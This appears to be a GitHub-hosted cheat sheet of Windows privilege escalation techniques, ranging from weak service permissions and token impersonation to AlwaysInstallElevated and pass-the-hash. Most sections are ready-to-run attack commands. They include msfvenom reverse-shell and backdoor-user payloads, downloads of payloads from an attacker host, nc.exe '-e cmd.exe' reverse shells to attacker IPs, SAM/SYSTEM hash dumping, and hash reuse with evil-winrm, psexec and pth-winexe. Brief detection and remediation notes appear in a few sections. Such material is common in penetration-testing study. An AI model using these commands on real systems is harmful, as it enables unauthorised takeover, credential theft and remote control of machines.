#####################################
Windows Privilege Escalation Examples
#####################################

<details>
<summary>Weak Service Permissions</summary>
 <br> 
========================
 
In Windows, services running as LocalSystem (highest privilege) with non-default or writable executable paths and weak permissions can be exploited for privilege escalation. This document provides detection, exploitation, and remediation steps.

🔍 1. Enumerate Services Running as LocalSystem with Non-Standard Paths
These services might use custom paths (e.g., C:\Users\Public\svc.exe) instead of the protected default (C:\Windows\System32).

✅ PowerShell:

    Get-WmiObject Win32_Service | Where-Object {
    $_.StartName -eq "LocalSystem" -and
    $_.PathName -notlike "C:\Windows\System32*"
    } | Select-Object Name, StartName, PathName

    
✅ WMIC:
cmd

    wmic service get name,startname,pathname | findstr /i "LocalSystem" | findstr /v /i "C:\\Windows\\System32"
<img width="1016" height="237" alt="image" src="https://github.com/user-attachments/assets/b58cd5a7-6d2d-4bba-b200-baa7cc66faee" />
🔐 2. Check Permissions on Service Configuration
Use AccessChk to determine whether a user can start, stop, configure, or modify a service.

✅ Command:
cmd

    .\accesschk64.exe /accepteula -uwcqv user servicename
Look for permissions like:

Permission	Meaning
SERVICE_ALL_ACCESS	Full control
SERVICE_CHANGE_CONFIG	Can change service binary path
WRITE_DAC / WRITE_OWNER	Can escalate to full control
GENERIC_WRITE / GENERIC_ALL	Equivalent to full control
<img width="939" height="407" alt="image" src="https://github.com/user-attachments/assets/e4ea7ead-9a28-4752-9e52-74c28bc09e8b" />

📂 3. Identify Writable Service Executables
✅ Export Executable Paths:

    for /f "tokens=2 delims='='" %a in ('wmic service list full ^| find /i "pathname" ^| find /v /i "system32"') do @echo %a >> C:\Windows\Temp\services.txt
✅ If wmic is not available:
cmd

    sc query state= all | findstr "SERVICE_NAME:" >> servicenames.txt
    FOR /F "tokens=2 delims= " %i in (servicenames.txt) DO @echo %i >> services.txt
    FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
✅ Check Permissions:
cmd

    for /f "delims=" %a in (C:\Windows\Temp\services.txt) do accesschk.exe /accepteula -qv "%a" >> accesschk.txt
Or use icacls/cacls:

    for /f "delims=" %a in (C:\Windows\Temp\services.txt) do icacls "%a" >> icacls.txt
Look for:

Symbol	Meaning
(F)	Full Access
(M)	Modify Access
(W)	Write Access
(WDAC)	Write DACL
(WO)	Write Owner

⚙️ 4. Exploitation Steps
✅ 4.1 Replace the Service Executable
Generate a reverse shell payload (Metasploit):

bash

    msfvenom -p windows/powershell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o reverse_priv.exe
Host it:

bash

    python3 -m http.server 8999
Transfer to target:

powershell

    wget http://<attacker_ip>:8999/reverse_priv.exe -o reverse_priv.exe
Overwrite service binary:

powershell

    copy reverse_priv.exe "C:\Path\To\Service.exe"
✅ 4.2 Start the Service
c

    sc start <service>
Or:

cmd

    net start <service>
⚡ 5. Writable Service Object Exploitation
✅ Find Writable Service Objects
cmd

    accesschk.exe /accepteula -uwcqv "Authenticated Users" *
✅ Update Service Binary Path
cmd

    sc config <service> binPath= "C:\Path\To\reverse_priv.exe"
Remove dependencies if blocking:

cmd

    sc config <service> depend= ""
Change service start mode to manual:

cmd

    sc config <service> start= demand
Update service to run as SYSTEM:

c

    sc config <service> obj= ".\LocalSystem" password= ""
✅ Start/Stop Service:
cmd

    sc stop <service>
sc start <service>
Or:

cmd

    net stop <service>
    net start <service>
🧪 6. Validate Exploitability
powershell

    Get-WmiObject Win32_Service -Filter "Name='<service>'" |Select-Object Name, DisplayName, StartMode, State, StartName, PathName
<img width="1064" height="161" alt="image" src="https://github.com/user-attachments/assets/6fdbbea7-d56e-4cb4-80a3-4f9016f995c8" />
    
🤖 7. Automated Enumeration
✅ SharpUp
Use SharpUp.exe for automated privilege escalation checks.

cmd

    SharpUp.exe --services
    or: SharpUp.exe audit
 <img width="974" height="482" alt="image" src="https://github.com/user-attachments/assets/b36466e1-923a-4ddb-8188-bcfb99ac4c76" />
   
✅ Summary of Exploit Steps
Step	Description
🔍 1	Find services running as LocalSystem with writable paths
🔐 2	Check if current user can change or control the service
💣 3	Replace binary with malicious payload
▶️ 4	Restart or trigger the service to execute payload
⚡ 5	Get SYSTEM-level shell

🔐 Remediation Checklist
✅ Always install services in C:\Windows\System32

✅ Set tight permissions using sc sdset or GPO

✅ Regularly audit services using:

 Sysinternals AccessChk

 PowerUp / SharpUp

✅ Enable AppLocker / Software Restriction Policies

✅ Monitor service creation/modification with Sysmon

</details>

<details>
<summary>SeBackupPrivilege</summary>
 <br> 
🔑 What is SeBackupPrivilege?
SeBackupPrivilege is a special Windows permission intended for backup operations.

It allows a user to bypass file ACLs and read any file on the system — even highly sensitive ones like:

C:\Windows\System32\config\SAM

C:\Windows\System32\config\SYSTEM

Attackers can abuse this to extract password hashes and escalate privileges.

🔍 Step 1: Check for SeBackupPrivilege
After getting access (e.g., through Evil-WinRM), check assigned privileges:

powershell

    whoami /priv
   <img width="923" height="339" alt="image" src="https://github.com/user-attachments/assets/18ee9197-db13-4739-b7cf-69ffa64bdf96" />

✅ Look for SeBackupPrivilege in the output.

📁 Step 2: Dump Registry Hives
Create a Temp Directory and Dump SAM & SYSTEM
powershell

    cd C:\
    mkdir Temp
    reg save hklm\sam C:\Temp\sam
    reg save hklm\system C:\Temp\system
 <img width="766" height="416" alt="image" src="https://github.com/user-attachments/assets/5f011469-d495-42eb-8b76-fe2af58a191e" />
   
📥 Step 3: Transfer Files to Kali
Use Evil-WinRM's built-in download command:

powershell

    cd Temp
    download sam
    download system
 <img width="563" height="298" alt="image" src="https://github.com/user-attachments/assets/178f145f-cb49-4cb4-9f82-6e1e424d6658" />
   
🔓 Step 4: Extract Hashes on Kali
🐍 Option 1: Using PyPyKatz
bash

    pypykatz registry --sam sam system
✅ This will output NTLM hashes like:
<img width="1021" height="296" alt="image" src="https://github.com/user-attachments/assets/cf46c206-5e73-4c69-ba4b-3ab653fe5069" />


Administrator:500:aad3b435b51404eeaad3b435b51404ee:5e0375cf8e440aa58a809d57edd78996::
🧰 Option 2: Using Impacket’s secretsdump.py

    cd ~/impacket
    python3 -m venv impacket-env
    source impacket-env/bin/activate
    secretsdump.py -system /home/kali/system -sam /home/kali/sam LOCAL
 <img width="1056" height="320" alt="image" src="https://github.com/user-attachments/assets/9fa97eb3-93ba-496e-9418-ecb08ed1bb24" />
   
🚪 Step 5: Lateral Movement / Privilege Escalation
Use the extracted NTLM hash to pivot or escalate.

🛠️ Option 1: Evil-WinRM (Pass-the-Hash)

evil-winrm -i <target-ip> -u <domain\user> -H <NTLM-hash>
Example:

    evil-winrm -i 192.168.216.130 -u corp\administrator -H 5e0375cf8e440aa58a809d57edd78996
🛠️ Option 2: CrackMapExec

    crackmapexec smb <target-ip> -u Administrator -H <NTLM-hash>
🛠️ Option 3: PsExec (from Impacket)

    psexec.py Administrator@<target-ip> -hashes :<NTLM-hash>
🧑‍💼 Bonus: Enumerate Users (Optional)
If you need to look up domain users on a DC:

powershell

    Get-ADUser -Filter * | Select-Object Name, SamAccountName
Requires ActiveDirectory module, usually available on domain controllers.

🔚 Summary
Step	Action
1️⃣	Check if user has SeBackupPrivilege
2️⃣	Dump SAM and SYSTEM hives using reg save
3️⃣	Download files using evil-winrm
4️⃣	Extract hashes with pypykatz or secretsdump.py
5️⃣	Reuse hashes with Evil-WinRM, CrackMapExec, or PsExec for lateral movement or privilege escalation

 </details>

 <details>
<summary>SeImpersonatePrivilege</summary>
 <br>
  =====================
  
🔍 What is SeImpersonatePrivilege?
The SeImpersonatePrivilege is a powerful permission in Windows that allows a user to impersonate the security context of another user. This is typically used by services to act on behalf of a client.

✅ If a low-privileged user account has SeImpersonatePrivilege, it can often be exploited to escalate to SYSTEM or Administrator using various impersonation attacks.

🧠 Why is it dangerous?
This privilege allows attackers to impersonate privileged tokens (like SYSTEM or admin) when certain services or RPC endpoints allow it.

It is commonly exploited in local privilege escalation (LPE) scenarios.

🔍 Identifying SeImpersonatePrivilege
Run this on the target system (PowerShell):

powershell

    whoami /priv | findstr SeImpersonatePrivilege
If you see it as Enabled, you can likely proceed with known exploits.
<img width="1041" height="362" alt="image" src="https://github.com/user-attachments/assets/aeb520d9-af88-4719-b8cb-4707dcabfedb" />

⚙️ Exploitation Tools
🔧 1. PrintSpoofer
PrintSpoofer abuses the SeImpersonatePrivilege via the Print Spooler service to impersonate SYSTEM.

🧪 Steps:
Upload the executable to the target system:

powershell

    upload PrintSpoofer.exe
<img width="1064" height="178" alt="image" src="https://github.com/user-attachments/assets/7d0e6a51-a786-4ae1-85a7-c54c65220d4c" />
    
Run PrintSpoofer to add your user to the Administrators group:

powershell

    .\PrintSpoofer.exe -i -c "net localgroup Administrators <user-name> /add"
-i → impersonate token

-c → command to execute as SYSTEM
<img width="1025" height="77" alt="image" src="https://github.com/user-attachments/assets/fed9f6a6-9e19-4292-9e6d-03c5d0059f91" />

✅ Your user is now part of the Administrators group.

🔧 2. GodPotato
GodPotato is a modern implementation of the RottenPotatoNG/JuicyPotato concept, abusing COM/RPC misconfigurations and SeImpersonate privilege to execute commands as SYSTEM.

🧪 Steps:
Upload the GodPotato executable:

powershell

    upload GodPotato-NET4.exe
Execute the command to add your user to the Administrators group:

powershell

.\GodPotato-NET4.exe -cmd "cmd /c net localgroup Administrators r.andrews /add"
✅ Once executed successfully, the user is elevated.
<img width="1052" height="574" alt="image" src="https://github.com/user-attachments/assets/ef72d9f6-4d43-45c8-8f50-7cca73d7e933" />

✅ Confirming Privilege Escalation
You can now verify that your user has admin access:

powershell

whoami /groups
net user <user-name>
Or list protected directories:

powershell

dir C:\Users\Administrator\
📌 Notes:
These exploits work only locally and require SeImpersonatePrivilege.

These tools may trigger EDR/AV, so obfuscation or alternative binaries might be needed.

Not all Windows builds are vulnerable; ensure the Print Spooler or vulnerable COM servers are available.

🧰 Alternative Tools & Techniques
Tool	Description
JuicyPotato	Legacy COM exploit, works only on older versions
RoguePotato	Bypasses newer Windows protections
PrintSpoofer	Exploits Print Spooler to impersonate SYSTEM
GodPotato	Updated COM exploit using .NET

📚 References
https://github.com/itm4n/PrintSpoofer

https://github.com/BeichenDream/GodPotato

  </details>
  
<details>
<summary>Unquoted Service Pathss</summary>
 <br> 

----------------------

Find unquoted service paths:

.. code-block:: none

    wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

If the unquoted service path is :code:`C:\Program Files\path to\service.exe`, you can place a binary in any of the following paths:

.. code-block:: none

    C:\Program.exe
    C:\Program Files.exe
    C:\Program Files\path.exe
    C:\Program Files\path to.exe
    C:\Program Files\path to\service.exe

</details>
<details>
<summary>Scheduled Task/Job</summary>
 <br> 
 =======================
 
An attacker can exploit Windows Task Scheduler to schedule malicious programs for initial or recurrent execution. For persistence, the attacker typically uses Windows Task Scheduler to launch applications at system startup or at predefined intervals. Furthermore, the attacker executes remote code under the context of a specified account to achieve Privilege Escalation.

Task Scheduler
 You can easily schedule an automatic job using the Task Scheduler service. When you utilize this service, you set up any program to run at a specific date and time that suits your needs. Subsequently, Task Scheduler evaluates the defined time or event criteria and runs the task once those conditions are met.

Abusing Schedule Task/Job
An attacker can escalate privileges by exploiting Schedule Task/Job. Following an initial foothold, we can query to obtain the list for the scheduled task.

    schtasks /query /fo LIST /V
This helps an attack to understand which application is attached to execute Job at what time.
 
 To obtain a reverse shell as NT Authority SYSTEM, first create a malicious EXE file that a scheduled task can execute. Using Msfvenom, we then generate the EXE file and inject it into the target system accordingly.

    msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.3 lport=8888 -f exe > shell.exe
To abuse the scheduled Task, the attacker will either modify the application by overwriting it or may replace the original file from the duplicate. To insert a duplicate file in the same directory, we rename the original file as a file.bak.

Then downloaded malicious file.exe in the same directory with the help of wget command.
   
    powershell wget 192.168.1.3/shell.exe –o file.exe
Once the duplicate file.exe is injected in the same directory then, the file.exe will be executed automatically through Task Scheduler. As attackers make sure that netcat listener must be at listening mode for obtaining reverse connection for privilege shell.

    nc -lvp 8888
    whoami /priv

Detection
Tools such as Sysinternals[https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns] Autoruns can detect system changes like showing presently scheduled jobs.
Tools like TCPView[https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview] & Process Explore[https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer] may help to identify remote connections for suspicious services or processes.
View Task Properties and History: To view a task’s properties and history by using a command line
Schtasks /Query /FO LIST /V

Enable the “Microsoft-Windows-TaskScheduler/Operational” configuration inside the event logging service to report scheduled task creation and updates.
</details>
<details>
<summary>Cleartext Passwords</summary>
 <br> 

===================

Find passwords in arbitrary files:

.. code-block:: none

    findstr /si password *.txt *.xml *.ini

Find strings in filenames:

.. code-block:: none

    dir /s *pass* == *cred* == *vnc* == *.config*

Find passwords in all files:

.. code-block:: none

    findstr /spin "password" *.*

Common files which contain passwords:

.. code-block:: none

    type c:\sysprep.inf
    type c:\sysprep\sysprep.xml
    type c:\unattend.xml
    type %WINDIR%\Panther\Unattend\Unattended.xml
    type %WINDIR%\Panther\Unattended.xml
    dir c:*vnc.ini /s /b
    dir c:*ultravnc.ini /s /b
    dir c:\ /s /b | findstr /si *vnc.ini

Search for passwords in the registry:

.. code-block:: none

    reg query HKLM /f password /t REG_SZ /s
    reg query HKCU /f password /t REG_SZ /s
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
    reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
    reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
    reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

</details>
<details>
<summary>Passing the Hash</summary>
 <br> 
================

The following commands can be used to dump password hashes:

.. code-block:: none

    wce32.exe -w
    wce64.exe -w
    fgdump.exe

Remote
------

Pass the hash remotely to gain a shell:

.. code-block:: none

    pth-winexe -U <domain>/<username>%<hash> //<target-ip> cmd

Sometimes you may need to reference the target by its hostname (add an entry to /etc/hosts to make it resolve):

.. code-block:: none

    pth-winexe -U <domain>/<username>%<hash> //<target-hostname> cmd

Alternative:

.. code-block:: none

    export SMBHASH=<hash>
    pth-winexe -U <domain>/<username>% //<target-ip> cmd

Local
-----

Pass the hash locally using runas:

.. code-block:: none

    C:\Windows\System32\runas.exe /env /noprofile /user:<username> <hash> "C:\Windows\Temp\nc.exe <attacker-ip> 53 -e cmd.exe"

Pass the hash locally using PowerShell:

.. code-block:: none

    secpasswd = ConvertTo-SecureString "<hash>" -AsPlainText -Force
    mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
    computer = "<hostname>"
    [System.Diagnostics.Process]::Start("C:\Windows\Temp\nc.exe","<attacker-ip> 53 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)

Pass the hash locally using psexec:

.. code-block:: none

    psexec64 \\<hostname> -u <username> -p <hash> -h "C:\Windows\Temp\nc.exe <attacker-ip> 53 -e cmd.exe"

</details>
<details>
<summary>Loopback Services</summary>
 <br> 
=================

Search for services listening on the loopback interface:

.. code-block:: none

    netstat -ano | findstr "LISTEN"

Use plink.exe to forward the loopback port to a port on our attacking host (via SSH):

.. code-block:: none

    plink.exe -l <attacker-username> -pw <attacker-password> <attacker-ip> -R <attacker-port>:127.0.0.1:<target-port>

</details>
<details>
<summary>AlwaysInstallElevated</summary>
 <br> 
=====================
 
🔍 Overview
AlwaysInstallElevated is a Windows policy setting that, when enabled, allows non-privileged users to install Microsoft Installer Packages (.msi files) with elevated (SYSTEM) privileges. This feature, originally intended for administrative convenience, becomes a serious security misconfiguration if both user-level and machine-level policies are enabled simultaneously.

⚠️ If both registry keys (HKCU and HKLM) have AlwaysInstallElevated = 1, any user can install MSI files with SYSTEM-level privileges.

🧪 Detection
Before exploitation, you need to check if the target machine is misconfigured:

✅ Check via Registry
powershell

    reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
Both keys must return AlwaysInstallElevated REG_DWORD 0x1 for the system to be vulnerable.
<img width="1061" height="261" alt="image" src="https://github.com/user-attachments/assets/3fad82f8-9c74-4d4d-9290-96e62ce68605" />

✅ Check via Enumeration Tools
Use winPEASany.exe on the target system to automatically enumerate this setting:

powershell

    .\winPEASany.exe all
Look under "Registry - AlwaysInstallElevated" section for any findings.
<img width="1041" height="119" alt="image" src="https://github.com/user-attachments/assets/eb4d5020-8458-41c9-985b-ab6cd9a2f5d1" />

✅ Remote PowerShell Shell Check (Optional)
If you have a reverse shell on the target, verify with:

powershell

    reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
    reg query HKLM\Software\Policies\Microsoft\Windows\Installer
Or automate using PowerShell:

powershell

    Get-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\Installer" | Select-Object AlwaysInstallElevated
    Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\Installer" | Select-Object AlwaysInstallElevated
💥 Exploitation
Once confirmed vulnerable, you can exploit the system by creating and executing a malicious .msi payload.

🔧 Step 1: Generate a Malicious MSI File
Option 1: Add User to Administrators Group
bash

    msfvenom -p windows/exec CMD='net localgroup administrators USERNAME /add' -f msi -o adduser.msi
Replace USERNAME with the low-privileged user account you want to escalate.

Option 2: Create a Backdoor User
bash

    msfvenom -p windows/adduser USER=pwned PASS=P@ssw0rd -f msi -o evil.msi
🌐 Step 2: Deliver Payload to Target
Option A: Host on Attacker Machine (Kali)
bash

    python3 -m http.server 8999
Option B: Direct Upload (if you have shell access)
powershell

    upload adduser.msi
Victim-side Download:
powershell

    Invoke-WebRequest -Uri "http://<Attacker-IP>:8999/adduser.msi" -OutFile "adduser.msi"
🚀 Step 3: Execute with SYSTEM Privileges
powershell

    msiexec /quiet /qn /i adduser.msi
/quiet /qn: Ensures the installation is completely silent (no GUI or prompts).

/i: Installs the specified MSI file.

🔎 Post-Exploitation: Verify Success
Confirm that the privilege escalation worked by checking group membership:

powershell
net localgroup administrators
You should now see the new or escalated user added to the Administrators group.
<img width="1062" height="586" alt="image" src="https://github.com/user-attachments/assets/b1865faf-8580-4771-bd50-5ef0742083f8" />

📘 Summary
Step	Description
1. Detect	Query registry or use winPEASany.exe to confirm both HKCU and HKLM values set to 1.
2. Create Payload	Use msfvenom to generate a .msi that adds a user or runs arbitrary commands.
3. Deliver Payload	Host on HTTP server or upload directly.
4. Execute with msiexec	msiexec /quiet /qn /i payload.msi runs it as SYSTEM.
5. Verify	Use net localgroup administrators to confirm elevated privileges.

🔐 Mitigation
Admins should ensure AlwaysInstallElevated is not enabled on both user and machine levels unless explicitly required (which is rare in modern environments).

To disable:

bash
     
     reg delete HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /f
     reg delete HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /f

</details>
<details>
<summary>Stored Credentials</summary>
 <br> 

==================

If there are stored credentials, we can run commands as that user:

.. code-block:: none

    $ cmdkey /list

    Currently stored credentials:

    Target: Domain:interactive=PWNED\Administrator
    Type: Domain Password
    User: PWNED\Administrator

Execute commands by using runas with the /savecred argument. Note that full paths are generally needed:

.. code-block:: none


    runas /user:PWNED\Administrator /savecred "C:\Windows\System32\cmd.exe /c C:\Users\Public\nc.exe -nv <attacker-ip> <attacker-port> -e cmd.exe"

   </details>
